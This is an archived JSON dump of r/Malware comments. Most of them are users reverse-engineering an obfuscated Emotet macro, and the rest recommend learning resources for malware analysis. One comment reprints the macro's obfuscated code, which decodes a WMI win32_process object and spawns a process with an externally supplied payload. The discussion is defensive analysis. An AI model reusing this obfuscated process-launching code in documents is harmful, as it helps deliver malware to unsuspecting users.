{"data": [{"all_awardings": [], "archived": false, "associated_award": null, "author": "twirpobloxias", "author_cakeday": true, "author_created_utc": 1533570419, "author_flair_background_color": null, "author_flair_css_class": null, "author_flair_richtext": [], "author_flair_template_id": null, "author_flair_text": null, "author_flair_text_color": null, "author_flair_type": "text", "author_fullname": "t2_1xjamphc", "author_is_blocked": false, "author_patreon_flair": false, "author_premium": false, "body": "This is the entire code obfuscated \n\nI put it on pastebin because of the 1000 character limit\n\n[https://pastebin.com/zLEb6cf5](https://pastebin.com/zLEb6cf5)", "can_gild": true, "collapsed": false, "collapsed_because_crowd_control": null, "collapsed_reason": null, "collapsed_reason_code": null, "comment_type": null, "controversiality": 0, "created_utc": 1618985743, "distinguished": null, "edited": false, "gilded": 0, "gildings": {}, "id": "gvao15w", "is_submitter": true, "link_id": "t3_mv2q0y", "locked": false, "no_follow": false, "parent_id": 36720345657, "permalink": "/r/Malware/comments/mv2q0y/emotet_vbs_script_complains_with_expected_sub/gvao15w/", "retrieved_utc": 1628212397, "score": 1, "score_hidden": false, "send_replies": true, "stickied": false, "subreddit": "Malware", "subreddit_id": "t5_2qrkp", "subreddit_type": "public", "top_awarded_type": null, "total_awards_received": 0, "treatment_tags": [], "updated_utc": 1668684325, "body_sha1": "20dce624c170fcce7a3b5370be547131d9e4603d", "utc_datetime_str": "2021-04-21 06:15:43"}, {"all_awardings": [], "archived": false, "associated_award": null, "author": "VikingFjorden", "author_created_utc": 1297930370, "author_flair_background_color": null, "author_flair_css_class": null, "author_flair_richtext": [], "author_flair_template_id": null, "author_flair_text": null, "author_flair_text_color": null, "author_flair_type": "text", "author_fullname": "t2_4urq3", "author_is_blocked": false, "author_patreon_flair": false, "author_premium": false, "body": "I don't know how OpenOffice is with macros, but in the Microsoft VBEditor, this line:\n\nAttribute VBA_ModuleType=VBAModule  \n\nis not an actual part of the visible source code, it's only visible if you export the macro and view the resulting file.\n\nTry removing that line (or placing all your text in a file, name it whatever.bas, and then use the Import function).\n\nEDIT: It's so elementary that it's actually hard to miss, but you can't put functions inside subs. Here's how your code should look:\n\n    Sub Dulz0g2a3qqdjsty7\n\t    skuwd = R94sbg0kp8g5 + Sky5mdbfre3xe7q8 _ . _ Content + Puaskfwqwxz_\n\n\t    wjnsc = \"x [ sh bpx [ sh b\"\n\t    Eh1e1l6qq9w6uz3 = \"x [ sh brox [ sh bx [ sh bcex [ sh bsx [ sh bsx [ sh bx [ sh b\"\n\t    Czs06fohvxu97 = \"x [ sh b:wx [ sh bx [ sh binx [ sh b3x [ sh b2x [ sh b_x [ sh b\"\n\t    Bte4bjpfxry = \"wx [ sh binx [ sh bmx [ sh bgmx [ sh btx [ sh bx [ sh b\"\n\t    Dj2098s6rmd = \"x [ sh bx [ sh b\" + Mid(Application.Name, 60 / 10, 1) + \"x [ sh bx [ sh b\"\n\n\t    Acanctsdu93 = Bte4bjpfxry + Dj2098s6rmd + Czs06fohvxu97 + wjnsc + Eh1e1l6qq9w6uz3\n\t    Yw3n4ijej_c5k = Bcdtdfsryv3bc(Acanctsdu93)\n\n\t    Set H2lplpiprsq2y = CreateObject(Yw3n4ijej_c5k)\n\t\n\t    njcnja = Mid(skuwd, (1 + 1 + 1 + 1), Len(skuwd))\n\t    nnjasd = Bcdtdfsryv3bc(njcnja)\n\t    H2lplpiprsq2y.Create nnjasd, Bf0256837rexe, A95ize8agn0fuh\n    End Sub\n\n    Function Bcdtdfsryv3bc(Ajy4p4krsdew9uay)\n\t    On Error Resume Next\n\t    Mpabacff47znxzxgma = Ajy4p4krsdew9uay\n\t    Gzkjanw1nxso6a7rna = Lf24kw93f4sab9(Mpabacff47znxzxgma)\n\t    Bcdtdfsryv3bc = Gzkjanw1nxso6a7rna\n    End Function\n\n    Function Lf24kw93f4sab9(Yawumzmq1cyapn)\n\t    Lf24kw93f4sab9 = Replace(Yawumzmq1cyapn, \"x [ sh b\", V8w_ubg25ws3wu8wgy)\n    End Function\n\nBut as you can see, something is missing. There's no deobfuscation here for the call to the contents of \"skuwd\", so this is unsolvable with the code you've pasted here. Did you delete a bit too much?", "can_gild": true, "collapsed": false, "collapsed_because_crowd_control": null, "collapsed_reason": null, "collapsed_reason_code": null, "comment_type": null, "controversiality": 0, "created_utc": 1618977290, "distinguished": null, "edited": true, "gilded": 0, "gildings": {}, "id": "gvacg1l", "is_submitter": false, "link_id": "t3_mv2q0y", "locked": false, "no_follow": true, "parent_id": null, "permalink": "/r/Malware/comments/mv2q0y/emotet_vbs_script_complains_with_expected_sub/gvacg1l/", "retrieved_utc": 1628213452, "score": 1, "score_hidden": false, "send_replies": true, "stickied": false, "subreddit": "Malware", "subreddit_id": "t5_2qrkp", "subreddit_type": "public", "top_awarded_type": null, "total_awards_received": 0, "treatment_tags": [], "updated_utc": 1668684305, "body_sha1": "bb104fab17806cdcc6b6d49a59e338edbced4c51", "edited_on": 1618977948, "nest_level": 1, "utc_datetime_str": "2021-04-21 03:54:50"}, {"all_awardings": [], "archived": false, "associated_award": null, "author": "VikingFjorden", "author_created_utc": 1297930370, "author_flair_background_color": null, "author_flair_css_class": null, "author_flair_richtext": [], "author_flair_template_id": null, "author_flair_text": null, "author_flair_text_color": null, "author_flair_type": "text", "author_fullname": "t2_4urq3", "author_is_blocked": false, "author_patreon_flair": false, "author_premium": false, "body": "It's left out on purpose. If you do the replace with just \"\", the first round of replaces should turn out to be something like:\n\nwinmgmt:win32_process\n\nSo it's trying to spawn a win32 shell object, but we don't know which one because it's fetching the name of the object and what arguments to pass to it from somewhere outside the source code. Presumably the infection carrier, like a Word doc.", "can_gild": true, "collapsed": false, "collapsed_because_crowd_control": null, "collapsed_reason": null, "collapsed_reason_code": null, "comment_type": null, "controversiality": 0, "created_utc": 1618977127, "distinguished": null, "edited": false, "gilded": 0, "gildings": {}, "id": "gvac6qg", "is_submitter": false, "link_id": "t3_mv2q0y", "locked": false, "no_follow": true, "parent_id": 36719638738, "permalink": "/r/Malware/comments/mv2q0y/emotet_vbs_script_complains_with_expected_sub/gvac6qg/", "retrieved_utc": 1628213478, "score": 1, "score_hidden": false, "send_replies": true, "stickied": false, "subreddit": "Malware", "subreddit_id": "t5_2qrkp", "subreddit_type": "public", "top_awarded_type": null, "total_awards_received": 0, "treatment_tags": [], "updated_utc": 1668684304, "body_sha1": "bd40234e9ccff4f16740c26a9cce73cb90f69b42", "utc_datetime_str": "2021-04-21 03:52:07"}, {"all_awardings": [], "archived": false, "associated_award": null, "author": "twirpobloxias", "author_cakeday": true, "author_created_utc": 1533570419, "author_flair_background_color": null, "author_flair_css_class": null, "author_flair_richtext": [], "author_flair_template_id": null, "author_flair_text": null, "author_flair_text_color": null, "author_flair_type": "text", "author_fullname": "t2_1xjamphc", "author_is_blocked": false, "author_patreon_flair": false, "author_premium": false, "body": "well I just checked out the original code and from what I can see the variable itself was only added at the end", "can_gild": true, "collapsed": false, "collapsed_because_crowd_control": null, "collapsed_reason": null, "collapsed_reason_code": null, "comment_type": null, "controversiality": 0, "created_utc": 1618969977, "distinguished": null, "edited": false, "gilded": 0, "gildings": {}, "id": "gv9zi9c", "is_submitter": true, "link_id": "t3_mv2q0y", "locked": false, "no_follow": true, "parent_id": 36719638738, "permalink": "/r/Malware/comments/mv2q0y/emotet_vbs_script_complains_with_expected_sub/gv9zi9c/", "retrieved_utc": 1628216802, "score": 1, "score_hidden": false, "send_replies": true, "stickied": false, "subreddit": "Malware", "subreddit_id": "t5_2qrkp", "subreddit_type": "public", "top_awarded_type": null, "total_awards_received": 0, "treatment_tags": [], "updated_utc": 1668684280, "body_sha1": "1572ed135351de9e0929b26381bd6a7df8064b84", "utc_datetime_str": "2021-04-21 01:52:57"}, {"all_awardings": [], "archived": false, "associated_award": null, "author": "PingTrip", "author_created_utc": 1326725524, "author_flair_background_color": null, "author_flair_css_class": null, "author_flair_richtext": [], "author_flair_template_id": null, "author_flair_text": null, "author_flair_text_color": null, "author_flair_type": "text", "author_fullname": "t2_6of9f", "author_is_blocked": false, "author_patreon_flair": false, "author_premium": true, "body": "Can you check the original script for the variable `V8w_ubg25ws3wu8wgy`? The last function references it as part of the de-obfuscation routine but it isn't assigned in the code you posted. You may have inadvertently removed some needed code when trimming the \"dead\" stuff.", "can_gild": true, "collapsed": false, "collapsed_because_crowd_control": null, "collapsed_reason": null, "collapsed_reason_code": null, "comment_type": null, "controversiality": 0, "created_utc": 1618968839, "distinguished": null, "edited": false, "gilded": 0, "gildings": {}, "id": "gv9xaky", "is_submitter": false, "link_id": "t3_mv2q0y", "locked": false, "no_follow": true, "parent_id": null, "permalink": "/r/Malware/comments/mv2q0y/emotet_vbs_script_complains_with_expected_sub/gv9xaky/", "retrieved_utc": 1628217013, "score": 1, "score_hidden": false, "send_replies": true, "stickied": false, "subreddit": "Malware", "subreddit_id": "t5_2qrkp", "subreddit_type": "public", "top_awarded_type": null, "total_awards_received": 0, "treatment_tags": [], "updated_utc": 1668684276, "body_sha1": "672aaf0dffd237f494106aa668b2f609892eb856", "nest_level": 1, "utc_datetime_str": "2021-04-21 01:33:59"}, {"all_awardings": [], "archived": false, "associated_award": null, "author": "[deleted]", "author_created_utc": null, "author_flair_background_color": "", "author_flair_css_class": null, "author_flair_template_id": null, "author_flair_text": null, "author_flair_text_color": "dark", "author_is_blocked": false, "body": "He means something that a person can just analyze the functions and determine what it\u2019s doing. Advanced is anti disassembly and anti debugging. Something that makes analyzing code much harder", "can_gild": false, "collapsed": false, "collapsed_because_crowd_control": null, "collapsed_reason": null, "collapsed_reason_code": null, "comment_type": null, "controversiality": 0, "created_utc": 1618967441, "distinguished": null, "edited": false, "gilded": 0, "gildings": {}, "id": "gv9ul6b", "is_submitter": false, "link_id": "t3_mv3gi8", "locked": false, "no_follow": false, "parent_id": 36719441301, "permalink": "/r/Malware/comments/mv3gi8/easy_malware_to_reverse_engineer/gv9ul6b/", "retrieved_utc": 1628217276, "score": 4, "score_hidden": false, "send_replies": true, "stickied": false, "subreddit": "Malware", "subreddit_id": "t5_2qrkp", "subreddit_type": "public", "top_awarded_type": null, "total_awards_received": 0, "treatment_tags": [], "updated_utc": 1668684271, "body_sha1": "e2aa39e0e4b404e6aeaf17de8758c1a5c3519308", "utc_datetime_str": "2021-04-21 01:10:41"}, {"all_awardings": [], "archived": false, "associated_award": null, "author": "[deleted]", "author_created_utc": null, "author_flair_background_color": "", "author_flair_css_class": null, "author_flair_template_id": null, "author_flair_text": null, "author_flair_text_color": "dark", "author_is_blocked": false, "body": "Win32.infostealer.dexter", "can_gild": false, "collapsed": false, "collapsed_because_crowd_control": null, "collapsed_reason": null, "collapsed_reason_code": null, "comment_type": null, "controversiality": 0, "created_utc": 1618967389, "distinguished": null, "edited": false, "gilded": 0, "gildings": {}, "id": "gv9uhlu", "is_submitter": false, "link_id": "t3_mv3gi8", "locked": false, "no_follow": true, "parent_id": null, "permalink": "/r/Malware/comments/mv3gi8/easy_malware_to_reverse_engineer/gv9uhlu/", "retrieved_utc": 1628217284, "score": 1, "score_hidden": false, "send_replies": true, "stickied": false, "subreddit": "Malware", "subreddit_id": "t5_2qrkp", "subreddit_type": "public", "top_awarded_type": null, "total_awards_received": 0, "treatment_tags": [], "updated_utc": 1668684270, "body_sha1": "d1fb0648add2ab456453e85458b4e59e8f1c5d0e", "nest_level": 1, "utc_datetime_str": "2021-04-21 01:09:49"}, {"all_awardings": [], "archived": false, "associated_award": null, "author": "LightningRurik", "author_created_utc": 1320140265, "author_flair_background_color": null, "author_flair_css_class": null, "author_flair_richtext": [], "author_flair_template_id": null, "author_flair_text": null, "author_flair_text_color": null, "author_flair_type": "text", "author_fullname": "t2_65md9", "author_is_blocked": false, "author_patreon_flair": false, "author_premium": false, "body": "What do you mean by \"Simple\" and \"Advanced\"? The learning curve is all over the place. Things I see as Simple are Advanced to others, and vice versa.\n\nIMO, go look at CTF binaries. Very similar approaches. Use a write-up to determine its difficulty.", "can_gild": true, "collapsed": false, "collapsed_because_crowd_control": null, "collapsed_reason": null, "collapsed_reason_code": null, "comment_type": null, "controversiality": 1, "created_utc": 1618966654, "distinguished": null, "edited": true, "gilded": 0, "gildings": {}, "id": "gv9t28l", "is_submitter": false, "link_id": "t3_mv3gi8", "locked": false, "no_follow": false, "parent_id": null, "permalink": "/r/Malware/comments/mv3gi8/easy_malware_to_reverse_engineer/gv9t28l/", "retrieved_utc": 1628217426, "score": -1, "score_hidden": false, "send_replies": true, "stickied": false, "subreddit": "Malware", "subreddit_id": "t5_2qrkp", "subreddit_type": "public", "top_awarded_type": null, "total_awards_received": 0, "treatment_tags": [], "updated_utc": 1668684268, "body_sha1": "bd7a0f287c0eaae60cc9cb88935600b0dad2addf", "edited_on": 1619094285, "nest_level": 1, "utc_datetime_str": "2021-04-21 00:57:34"}, {"all_awardings": [], "archived": false, "associated_award": null, "author": "kcirtappockets", "author_created_utc": 1340164711, "author_flair_background_color": null, "author_flair_css_class": null, "author_flair_richtext": [], "author_flair_template_id": null, "author_flair_text": null, "author_flair_text_color": null, "author_flair_type": "text", "author_fullname": "t2_81zzi", "author_is_blocked": false, "author_patreon_flair": false, "author_premium": false, "body": "There is https://github.com/ytisf/theZoo\n\nIt has the reversed source code too", "can_gild": true, "collapsed": false, "collapsed_because_crowd_control": null, "collapsed_reason": null, "collapsed_reason_code": null, "comment_type": null, "controversiality": 0, "created_utc": 1618964484, "distinguished": null, "edited": false, "gilded": 0, "gildings": {}, "id": "gv9otd4", "is_submitter": false, "link_id": "t3_mv3gi8", "locked": false, "no_follow": false, "parent_id": null, "permalink": "/r/Malware/comments/mv3gi8/easy_malware_to_reverse_engineer/gv9otd4/", "retrieved_utc": 1628217835, "score": 13, "score_hidden": false, "send_replies": true, "stickied": false, "subreddit": "Malware", "subreddit_id": "t5_2qrkp", "subreddit_type": "public", "top_awarded_type": null, "total_awards_received": 0, "treatment_tags": [], "updated_utc": 1668684259, "body_sha1": "004bd00696f34838513aab62844adf2ab2ada67c", "nest_level": 1, "utc_datetime_str": "2021-04-21 00:21:24"}, {"all_awardings": [], "archived": false, "associated_award": null, "author": "revolver-ocelot-saa", "author_created_utc": 1566794950, "author_flair_background_color": null, "author_flair_css_class": null, "author_flair_richtext": [], "author_flair_template_id": null, "author_flair_text": null, "author_flair_text_color": null, "author_flair_type": "text", "author_fullname": "t2_4g9r43y9", "author_is_blocked": false, "author_patreon_flair": false, "author_premium": false, "body": "If you haven\u2019t already, working throughout the exercises and chapters in Practical Malware Analysis is a good starting point.", "can_gild": true, "collapsed": false, "collapsed_because_crowd_control": null, "collapsed_reason": null, "collapsed_reason_code": null, "comment_type": null, "controversiality": 0, "created_utc": 1618963437, "distinguished": null, "edited": false, "gilded": 0, "gildings": {}, "id": "gv9mqfv", "is_submitter": false, "link_id": "t3_mv3gi8", "locked": false, "no_follow": false, "parent_id": null, "permalink": "/r/Malware/comments/mv3gi8/easy_malware_to_reverse_engineer/gv9mqfv/", "retrieved_utc": 1628218032, "score": 19, "score_hidden": false, "send_replies": true, "stickied": false, "subreddit": "Malware", "subreddit_id": "t5_2qrkp", "subreddit_type": "public", "top_awarded_type": null, "total_awards_received": 0, "treatment_tags": [], "updated_utc": 1668684255, "body_sha1": "e9b240fd07bd4271750fcb4592f489cbcf8b5e68", "nest_level": 1, "utc_datetime_str": "2021-04-21 00:03:57"}], "error": null, "metadata": {"es": {"took": 153, "timed_out": false, "_shards": {"total": 824, "successful": 824, "skipped": 820, "failed": 0}, "hits": {"total": {"value": 14, "relation": "eq"}, "max_score": null}}, "es_query": {"size": 10, "query": {"bool": {"must": [{"bool": {"must": [{"range": {"created_utc": {"gte": 1618902060000}}}, {"range": {"created_utc": {"lt": 1618988460000}}}]}}, {"bool": {"should": [{"match": {"subreddit": "malware"}}], "minimum_should_match": 1}}]}}, "aggs": {}, "sort": {"created_utc": "desc"}}, "es_query2": "{\"size\":10,\"query\":{\"bool\":{\"must\":[{\"bool\":{\"must\":[{\"range\":{\"created_utc\":{\"gte\":1618902060000}}},{\"range\":{\"created_utc\":{\"lt\":1618988460000}}}]}},{\"bool\":{\"should\":[{\"match\":{\"subreddit\":\"malware\"}}],\"minimum_should_match\":1}}]}},\"aggs\":{},\"sort\":{\"created_utc\":\"desc\"}}", "api_launch_time": 1673945683.810305, "api_request_start": 1674110929.666749, "api_request_end": 1674110929.856227, "api_total_time": 0.18947792053222656}}